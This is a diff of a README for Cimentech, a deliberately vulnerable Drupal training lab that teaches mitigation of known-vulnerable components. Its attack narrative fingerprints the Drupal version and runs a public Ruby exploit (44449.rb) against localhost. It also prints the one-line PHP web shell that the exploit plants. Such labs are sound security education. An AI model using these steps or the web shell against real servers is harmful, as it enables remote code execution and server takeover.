@@ -1,43 +1,132 @@
 # Cimentech
- > This is a simple web application built with Drupal that contains an example of a component with a known vulnerabilty.
 
 <p align="center">
- <img width="560" height="" src="docs/attack1.png">
+    <img src="images/attack1.png"/>
 </p>
+
+Cimentech is a simple web application built with Drupal that contains an example of a component with a known vulnerabilty and it's main goal is to demonstrate how an attacker could exploit it.
+
+## Index
+
+- [Definition](#what-does-it-mean-to-use-a-component-with-known-vulnerabilities)
+- [Setup](#setup)
+- [Attack narrative](#attack-narrative)
+- [Objectives](#secure-this-app)
+- [Solutions](#pr-solutions)
+- [Contributing](#contributing)
 
 ## What does it mean to use a component with known vulnerabilities?
 
-Definition from [OWASP](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf):
+Imagine that components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
 
-Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
+The main goal of this app is to discuss how **Using Components With Known Vulnerabilities** can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.
 
-## Requirements
+## Setup
 
-To build this lab you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install].
+To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
-## Deploy and Run
-
-After cloning this repository, you can type the following command to start the vulnerable application:
+```sh
+cd secDevLabs/owasp-top10-2017-apps/a9/cimentech
+```
 
 ```sh
 make install
 ```
 
-Then simply visit [localhost:80][App] !
+Then simply visit [localhost:80][App] ! 😆
 
-## Attack Narrative
+## Get to know the app 🏗
 
-To understand how this vulnerability can be exploited, check [this section]!
+To properly understand how this application works, you could:
 
-## Mitigating the vulnerability
+- Visit it's homepage!
 
-(Spoiler alert 🧐) To understand how this vulnerability can be mitigated, check [this other section](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3ACimentech)!
+## Attack narrative
+
+Now that you know the purpose of this app, what could possibly go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or it's users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
+
+### 👀
+
+#### Use of a vulnerable Drupal version allows for remote code execution
+
+
+It's possible to reach the server's web application from the standard HTTP port 80, as shown by the image below:
+
+<img src="images/attack1.png" align="center"/>
+
+Afterwards, by having a look at the `/robots.txt` file, it's possible to find the `CHANGELOG.txt` file in the `Disallow` field, as depicted by the image below:
+
+<img src="images/attack2.png" align="center"/>
+
+When accessed, an indication of the version of the Content Management System (Drupal) can be found, as shown below:
+
+<img src="images/attack3.png" align="center"/>
+
+Having the CMS version, it's possible to check on [exploit-db][3] if there are any exploits associated with that version, in this case, Drupal 7.57. The results of the search are depicted on the image below:
+
+<img src="images/attack4.png" align="center"/>
+
+By using [searchsploit](https://www.exploit-db.com/searchsploit), an attacker could also find this same result via terminal. To install it, simply type the following in your OSX terminal (keep in mind it might trigger your anti-virus software) :
+
+```sh
+brew install exploitdb
+```
+
+Then simply search for the version of the CMS found:
+
+```sh
+searchsploit drupal 7.
+```
+
+If you are using OSX, this command will help you to copy the exploit to your `/tmp` folder:
+
+```
+cp /usr/local/opt/exploitdb/share/exploit-database/exploits/php/webapps/44449.rb /tmp
+```
+
+## 🔥
+
+Running the malicious Ruby code, we have evidence that a remote code execution is possible on the web server, using the following commands as shown below:
+
+```sh
+ruby /tmp/44449.rb http://localhost
+```
+
+<img src="images/attack5.png" align="center"/>
+
+**NOTE**: You need to have Ruby installed on your system to run the exploit, for information on how to install it, click [here][1]!
+
+**NOTE 2**: If you came across an execution error when trying to run the exploit, please have a look at this [Issue][4] for information on how to proceed.
+
+The exploit works by adding into the server a malicious `s.php`, which allows remote code execution on it via following malicious content: 
+
+```php
+<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+```
+
+Using the exploit's "fake shell", we can type a command, such as `whoami`, to verify that we indeed have a RCE on the server, as shown by the image:
+
+<img src="images/attack6.png" align="center"/>
+
+## Secure this app
+
+How would you migitate this vulnerability? After your changes, an attacker should not be able to:
+
+* Execute code remotely through the exploit above
+
+## PR solutions
+
+[Spoiler alert 🚨] To understand how this vulnerability can be mitigated, check out [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3ACimentech)!
 
 ## Contributing
 
-Yes, please. :zap:
+We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
 [Docker Install]:  https://docs.docker.com/install/
 [Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://127.0.0.1:80/
-[this section]: docs/ATTACK.md
+[App]: http://localhost:80
+[secDevLabs]: https://github.com/globocom/secDevLabs
+[1]: https://www.ruby-lang.org/en/documentation/installation/
+[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a9/Cimentech
+[3]: https://www.exploit-db.com/
+[4]: https://github.com/globocom/secDevLabs/issues/212
